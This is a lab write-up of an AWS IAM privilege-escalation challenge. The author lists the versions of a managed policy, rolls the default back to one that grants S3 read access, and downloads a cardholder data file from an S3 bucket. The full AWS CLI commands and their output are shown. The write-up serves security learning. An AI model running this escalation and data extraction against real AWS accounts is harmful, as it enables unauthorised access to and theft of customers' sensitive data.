# Challenge Lab Name: `PrivEsc via IAM Version Rollback`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://cybr.com" target="_blank" title="Open Cybr Labs Platform"><img src="https://img.shields.io/badge/Cybr_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Cybr Labs Platform Link"></a> &nbsp;
>
>This lab has been misconfigured, so exploit it with iam:SetDefaultPolicyVersion to grant yourself S3 permissions.

</details>

<details open>
<summary><b>Initial Access</b></summary>

The initial access given were AWS credentials. In a real-world pentest these credentials could have been given as a standard IAM user from a company, or they could have been credentials found hardcoded in a software's source code. 

I configured an AWS profile **priv** by running the command `aws configure --profile priv` and pasting in the credentials. I used the default region of **us-east-1** and the default output as **json**. I then checked what user I was by running the command below.


```bash
└─$ aws sts get-caller-identity --profile priv
{
    "UserId": "AIDATMGJV6DJP3BED3PH3",
    "Account": "232351199442",
    "Arn": "arn:aws:iam::232351199442:user/iamrollback-user"
}
```

Knowing that the IAM user was **iamrollback-user** I checked which policies were attached to this user by running the command below. 

```bash
└─$ aws iam list-attached-user-policies --user-name iamrollback-user --profile priv
{
    "AttachedPolicies": [
        {
            "PolicyName": "policyforexploitableuser",
            "PolicyArn": "arn:aws:iam::232351199442:policy/policyforexploitableuser"
        }
    ]
}
```

To see the statements inside the policy found, `arn:aws:iam::232351199442:policy/policyforexploitableuser`, I first needed to find the default version for this policy by running the command below.  

```bash
└─$ aws iam get-policy --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --profile priv
{
    "Policy": {
        "PolicyName": "policyforexploitableuser",
        "PolicyId": "ANPATMGJV6DJFEXZ5OJMA",
        "Arn": "arn:aws:iam::232351199442:policy/policyforexploitableuser",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Managed policy for exploitable user",
        "CreateDate": "2026-11-11T00:37:33+00:00",
        "UpdateDate": "2026-11-11T00:37:57+00:00",
        "Tags": [
            {
                "Key": "Lifetime",
                "Value": "Temporary"
...
```

From the output above I could see that the default version was `v1`. To check the statements inside I ran the command below.  

```bash
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --version-id v1 --profile priv
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:iam::232351199442:user/iamrollback-user",
                        "arn:aws:iam::232351199442:policy/policyforexploitableuser"
                    ],
                    "Sid": "IAMPrivilegeEscalationByRollback"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-11-11T00:37:33+00:00"
    }
}
```

From the statements inside the policy document I could see that the IAM user had permission to use the [IAM](https://docs.aws.amazon.com/IAM/latest/APIReference/API_GetUser.html) `list` and `get` commands, and also had the permission to  `iam:SetDefaultPolicyVersion`. 

The command allowing me to set the default policy version can be checked from this AWS documentation [page](https://docs.aws.amazon.com/IAM/latest/APIReference/API_SetDefaultPolicyVersion.html), which shares that I could change what the default policy version is and therefore change my IAM user's permissions. To learn about how policies and their versions are managed there is this documentation [page](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html) that I found really helpful. 


### Check Policy Versions

Since I knew that this IAM user had permission to view policies and also set a default policy version I went ahead and checked what versions of the policy `arn:aws:iam::232351199442:policy/policyforexploitableuser` were available by running the command below. 

```bash
└─$ aws iam list-policy-versions --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --profile priv
{
    "Versions": [
        {
            "VersionId": "v4",
            "IsDefaultVersion": false,
            "CreateDate": "2026-11-11T00:37:57+00:00"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2026-11-11T00:37:57+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2026-11-11T00:37:56+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2026-11-11T00:37:33+00:00"
        }
    ]
}
```
From the output I could see that there were 3 other versions of the policy besides version `v1` that I originally saw. 

Since I wanted to gain more privileges than the last role I went ahead and checked what each of these policies contained using the command I've used before but for the other versions of the policy. 

```bash
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --version-id v2 --profile priv
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "s3:*",
                    "Condition": {
                        "DateGreaterThan": {
                            "aws:CurrentTime": "2017-07-01T00:00:00Z"
                        },
                        "DateLessThan": {
                            "aws:CurrentTime": "2017-12-31T23:59:59Z"
                        }
                    },
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2026-11-11T00:37:56+00:00"
    }
}
```

The policy version `v2` showed that the IAM user would have only been allowed to run any S3 commands between the dates and times of **2017-07-01T00:00:00Z** and **2017-12-31T23:59:59Z**. Since there was this specific condition I would not be able to perform any actions. 


```bash
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --version-id v3 --profile priv
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "*",
                    "Condition": {
                        "NotIpAddress": {
                            "aws:SourceIp": [
                                "192.0.2.0/24",
                                "203.0.113.0/24"
                            ]
                        }
                    },
                    "Effect": "Deny",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v3",
        "IsDefaultVersion": false,
        "CreateDate": "2026-11-11T00:37:57+00:00"
    }
}
```

The policy version `v3` denies any action on any resource if the IP address does not match the CIDR range listed in the condition statement. Since this condition restricts IP addresses to only two specific ranges this policy version would not be helpful. 

```bash
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --version-id v4 --profile priv
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "s3:List*",
                        "s3:Get*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v4",
        "IsDefaultVersion": false,
        "CreateDate": "2026-11-11T00:37:57+00:00"
    }
}
```

The policy version `v4` would allow the IAM user to list S3 buckets and get any objects inside the S3 bucket with no conditions. This would allow the current IAM user to get any information found in any S3 buckets on the AWS account. 

</details>

<details open>
<summary><b>Privilege Escalation & Data Extraction</b></summary>

From the commands ran earlier I knew that the default version of this policy was `v1`, but I wanted more privileges than given. Viewing the different versions of the policy I decided that the version `v4` would allow be best to set as the default version, as it would grant me newer privileges. 

### Change Default Policy Version

Running the command below I could set the default version of the policy to `v4` which would allow the current IAM user to list S3 buckets and get objects. This command will not produce an output, but if I tried one of the IAM commands used earlier I would get an **AccessDenied** error which would confirm these changes. 

```bash
└─$ aws iam set-default-policy-version --policy-arn arn:aws:iam::232351199442:policy/policyforexploitableuser --version-id v4 --profile priv
```

With the policy changed for the current IAM user I went ahead and checked what S3 buckets were inside the AWS account by running the command below. 

```bash
└─$ aws s3 ls --profile priv                                            
2026-11-10 16:37:34 iamrollback-cardholder-data-bucket-232351199442
```

From the output I could see that there was an S3 bucket in the AWS account. To find what objects where inside the object I ran the command below. 

```bash
└─$ aws s3 ls s3://iamrollback-cardholder-data-bucket-232351199442 --profile priv
2026-11-10 16:37:35      58878 cardholder_data_primary.csv
```

This output showed me that there was a file with a name that let me know it was probably sensitive information. To download the file to my current working directory I ran the command shown below. 

```bash
└─$ aws s3 cp s3://iamrollback-cardholder-data-bucket-232351199442/cardholder_data_primary.csv . --profile priv
download: s3://iamrollback-cardholder-data-bucket-232351199442/cardholder_data_primary.csv to ./cardholder_data_primary.csv
```

Opening LibreOffice I was able to view the file that was downloaded from the S3 bucket. When taking a closer look I could see that this contained a lot of customer information, and even included their social security numbers. 

<div align="center">
  <img src="../images/PrivEsc-via-IAM-Version-Rollback/Pasted image 20261110165317.png" alt="Viewing the `cardholder_data_primary.csv` with sensitive customer information." width="500" />
  <p><em>Viewing the `cardholder_data_primary.csv` with sensitive customer information.</em></p>
</div>



</details>

<details open>
<summary><b>Impact & Reflection</b></summary>

This demonstrated the impact that not only being able to check an IAM user's policies but also having permission to set a default policy version. From checking all the available versions of a policy I was able to extract sensitive customer information. This, in the real world, would cause financial and reputational losses to the company, or even running them out of business completely. Imagine if an older policy version was able to give the IAM user with initial access **AdministratorAccess** instead, and then that also could have been just as damaging or even more. 

</details>